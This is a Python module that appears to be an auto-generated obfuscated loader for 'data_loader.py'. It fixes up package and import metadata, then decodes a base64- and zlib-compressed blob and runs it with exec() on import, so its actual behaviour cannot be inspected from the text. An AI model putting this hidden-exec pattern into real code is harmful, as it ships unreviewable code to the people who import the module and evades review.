# Auto-generated loader (obfuscated)
# original filename: data_loader.py
import sys as _sys, os as _os, types as _types, base64 as _b64mod, zlib as _zlibmod
_p_645926f4a680 = (
    "eNqVVd9P2zAQfs9fcSoPSUTJytqxComHwjqNDaqyFiGoUOQkbuqRxJbt0pa/fmfnRwkITctLfPb5"
    "u++7u1wOYLTW/CilBZVE0wQyThIqwePRcq1is+U7B8AlS1lBMliyjBYkp6eQEE3C0jsQO4flgksN"
    "aqeAKAjx3QVerjku9U7Q0rKrLkRE0ZOB3YlOBjlPuvCSschumAXuOKEI+1H8JfpK+/1ePIAz8BzA"
    "p0Mn4mp2ezzfXWfT+WU2nc22P48nF71Bdjka5Xff+9e74cvkZfzj8u72eLIdnj+Mbu+uNlyTWe/X"
    "eLj6nH2b3oyX5xfjm/tOCZlu0vn0fnJ/lY7+nGynDx3Hd1A4LdRaUghDIzwMgRQJCBI/kZQCK5Yc"
    "llyCpBnR7Jl+IpHi2Vrjkc2GQhfFEgoJjXmCyUVR64w6acYjkinPX7g1sPuI6moDhT+l1japDsNA"
    "CiI104wXnhu4/qL32MaoGNUwePsV94auQqIpU5pKpMIKU6ugZKRgw/QKhOQCa2/w9ArFKt4I2XD5"
    "5LClxT61GasMKLg2YOErtNLBPMYjxF3DyhY+uLYuc1x75tB/5xo04c9ggb0TGCtImDS58OoU+Y/7"
    "i68iLwxKnQODZr1opuiek5a7vVFGrhi+A2q5oWCjdUUU0Vp69lYXOjXdjt9GbZD/W1BJ2eT3Q+c6"
    "6xmW02tH+SeNgAhBi8T7GH1fFLqNqdAwti9svza2IEqZRptK/mzanEDOCpbjmAhDJWiMklFFzpRi"
    "RQreimZCVR1lPvWIrsgz41L5prPc+o5bi2taHMfP3ghSqr29s2/6esKLqsCt4lYzqYkY5CReMZx0"
    "OztmGqu50PqoqgC2mxrXqn9neObVn2fXxi+T9nHCymQ1/MJ6Jpw18y4wW7mQVCmvGooBvkpH780w"
    "9P2gOnDXenk0dOv4hliF3d0L8p23zGwKqqxJwhSF3+tCs5yOpeTS63wn2AwJaG5/CbD/H1RTDDpw"
    "iANFSM9t/wqwJIfQObXnynwoFKP/Be5nDGg="
)

# ensure __file__ and package info for relative/absolute imports inside decoded module
globals()['__file__'] = __file__
_pkg = __name__.rpartition('.')[0]
globals()['__package__'] = _pkg

# ensure package is registered in sys.modules with proper __path__ so imports work
if _pkg:
    if _pkg not in _sys.modules:
        _pkg_mod = _types.ModuleType(_pkg)
        _pkg_mod.__path__ = [_os.path.dirname(__file__)]
        _sys.modules[_pkg] = _pkg_mod
    else:
        try:
            _pmod = _sys.modules[_pkg]
            if not hasattr(_pmod, "__path__"):
                _pmod.__path__ = [_os.path.dirname(__file__)]
            elif _os.path.dirname(__file__) not in list(_pmod.__path__):
                _pmod.__path__.append(_os.path.dirname(__file__))
        except Exception:
            pass

# Provide a minimal __spec__ if missing (helps importlib behaviors)
if '__spec__' not in globals() or globals().get('__spec__') is None:
    try:
        import importlib.machinery as _machinery
        globals()['__spec__'] = _machinery.ModuleSpec(__name__, None)
    except Exception:
        pass

try:
    _decoded = _zlibmod.decompress(_b64mod.b64decode(_p_645926f4a680)).decode('utf-8')
    exec(_decoded, globals())
except Exception as _e:
    raise RuntimeError("Failed to load obfuscated module " + repr('data_loader.py') + ": " + str(_e))
